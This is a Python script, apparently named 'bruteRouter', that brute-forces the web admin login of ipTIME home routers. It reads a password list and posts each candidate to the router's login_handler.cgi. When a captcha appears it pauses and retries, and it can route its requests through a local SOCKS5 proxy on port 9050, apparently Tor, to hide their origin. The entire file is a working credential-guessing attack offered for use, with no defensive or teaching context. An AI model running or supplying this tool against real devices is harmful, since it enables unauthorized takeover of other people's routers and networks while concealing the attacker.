import requests
import argparse
import time
from datetime import datetime



parse = argparse.ArgumentParser(description='arg')

parse.add_argument('-l', required=True, help='etc) root, admin')
parse.add_argument('-p', required=True, help='etc) ./passwords.txt')
parse.add_argument('-t', required=True, help='etc) http://192.168.0.1')
parse.add_argument('-proxy', help='etc) use port number 9050')

args = parse.parse_args()

username = args.l
base_url = args.t
proxy = args.proxy

proxies = {}

if proxy is not None:

	proxies = {
		'http' : 'socks5://127.0.0.1:' + proxy,
		'https' : 'socks5://127.0.0.1:' + proxy,
	}
	

passwords = []

def loadPasswords():
	
	print('loading: ' + args.p)
	
	f = open(args.p, encoding='UTF-8')
		
	while True:
		
		line = f.readline()
		if not line:
			break
		passwords.append( line.replace('\n', '') )
	
	print('loaded: ' + '(' + str( len(passwords) ) + ') passwords\n')
	



def payload():
	
	idx = 0
	
	if proxy is not None:
		print('proxy: proxy mode activity.')
	
	
	print('target: ' + base_url )
	
	print('start: exploit starting ' + str( datetime.now() ) + "\n" )
	
	headers = { 'Referer': base_url + '/login/login.cgi' }

	for passwd in passwords:		
		
		while True:
			url = base_url + '/sess-bin/login_session.cgi'
			res = requests.get(url, headers=headers, proxies=proxies).text
			
			if "<IFRAME NAME=iframe_captcha ID=iframe_captcha SRC=\"/sess-bin/captcha.cgi\"" in res:
				print("failed: Need captcah certify.")
				print("wait: wait 60s & retry\n")
				time.sleep(60)
			
			else:
				break


		print("try: login request send.")
				
		idx += 1
		print( '[ ' + passwd + ' ]'  + ' (' + str(idx) + '/' + str( len(passwords) ) + ')' )			
			
		url = base_url + '/sess-bin/login_handler.cgi'
		
		headers = { 'Referer': base_url + '/sess-bin/login_session.cgi?noauto=1' }
		res = requests.post(url, data={'init_status':'1', 'captcha_on':'0', 'captcha_file':'', 'default_passwd':"Password+is+'admin'.+Change+the+password.", 'captcha_code':'', 'username':username, 'passwd':passwd}, headers=headers, proxies=proxies).text
		if "<script>parent.parent.location = \"/sess-bin/login_session.cgi?noauto=1\";" in res:
			print("failed: Wrong account.")

		else:
			print('\n\nSUCCESS: find account!\a')
			print('FIND: ' + passwd )
			return 0
	

if __name__ == '__main__':
	
	print('\n<bruteRouter> for Iptime\n')
	
	loadPasswords()
	payload()
	
	print('end: ' + str( datetime.now() ) )
	print('program exit.')
	exit()
	